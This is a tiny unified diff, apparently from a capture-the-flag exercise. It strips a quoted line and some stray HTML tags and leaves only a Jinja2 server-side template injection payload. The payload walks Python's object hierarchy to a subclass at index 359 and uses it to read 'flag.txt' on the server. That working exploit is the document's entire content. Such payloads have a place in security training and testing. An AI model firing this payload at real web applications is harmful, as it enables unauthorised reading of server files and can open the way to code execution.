@@ -1,6 +1,1 @@
-
-"{{''.__class__.__mro__[1].__subclasses__()[359]('flag.txt').read()}}"
-
-<a href="../"></a>
-
-<dir></dir>
+{{''.__class__.__mro__[1].__subclasses__()[359]('flag.txt').read()}}
